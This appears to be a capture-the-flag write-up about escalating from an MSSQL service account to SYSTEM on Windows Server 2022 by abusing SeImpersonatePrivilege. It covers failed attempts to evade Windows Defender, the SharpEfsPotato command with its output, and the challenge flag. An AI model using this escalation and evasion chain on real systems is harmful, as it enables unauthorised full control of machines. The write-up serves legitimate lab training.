## Writeup

After getting the user flag I uploaded nc64.exe to get a reverse shell, and winpeas for mapping out potential local privilege escalation possibilities. Winpeas was immediately detected and removed by Windows Defender. I therefore did a manual enumeration instead. I checked the `systeminfo` to figure out the OS version and checked the account privileges of the `nt service\mssqlserver` account. The box was a Window Server 2022 and the user we had a shell as had the following privileges:

```
whoami /priv 
```

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Windows\system32>

```

From this i see that 'Seimpersonateprivilege' is enabled. The [Seimpersonateprivilege](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) also known as the "Impersonate a client after authentication" is a right that is enabled by default for the Device's Local Service account and the Device's Local Administrators group. When a user is given this right, they are permitted to run programs on behalf of a client, which is the baseline for this type of Windows privilege escalation technique going from a service account to SYSTEM based on the SeImpersonatePrivilege right being enabled. A large family of tools are made for abusing this privilege being set, with a common "Potato" naming. The usual flow for these Potato tools are as follows:

1. Check if user has the SeImpersonatePrivilege enabled
2. Create a fake COM or RPC service that waits for a privileged process, like nt authority\system to connect
3. Trigger some Windows service or COM interface that makes a connection to your server (e.g BITS, DCOM, or Print Spooler)
4. When SYSTEM connects, impersonate that token using the user's SeImpersonatePrivilege 
5. Duplicate that token and spawn a new process running as SYSTEM.

 I tried a couple potato variants before landing on one that worked. I first tried GodPotato, after that JuicyPotato and lastly SigmaPotato, but they were all detected and removed by Windows Defender almost immediately after being uploaded. Same goes for the SigmaPotato's powershell script (Invoke-SigmaPotato.ps1) which contains the entire binary, where the byte stream is gzip compressed and base64 encoded. I even tried to modify strings inside the C# source code of some of the potatoes before compiling them locally in hopes that it would trick Windows Defender. Windows Defender still managed to detect these easily. I also tried making exclusion folders and even disabling Windows Defender, but I had insufficent rights to do so. 
 
 The only potato Windows Defender didnt manage to detect was [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato). This potato uses the EfsRpc (Encrypting File System Remote Procedure Call) interface to trigger the privilege escalation. After uploading the SharpEfsPotato to the Windows server I managed to get CE on it as nt authority\system. I used this elevated privilege to read the flag located in `C:\Users\Administator\flag.txt` as follows:
 
```
PS C:\Users\Public> .\potato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "cat C:\Users\Administrator\flag.txt | Set-Content C:\Users\Public\root.txt"
.\potato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "cat C:\Users\Administrator\flag.txt | Set-Content C:\Users\Public\root.txt"



```

Which gave the following

```
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/03221952-0f66-4bb6-83b1-788b9678f042/\03221952-0f66-4bb6-83b1-788b9678f042\03221952-0f66-4bb6-83b1-788b9678f042
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

We could then read the flag that had been written to root.txt 

```
PS C:\Users\Public> more root.txt
more root.txt
EPT{sweet_juicy_god_bakt_potet_paa_ruten}

PS C:\Users\Public> 
```

#### Flag: EPT{sweet_juicy_god_bakt_potet_paa_ruten}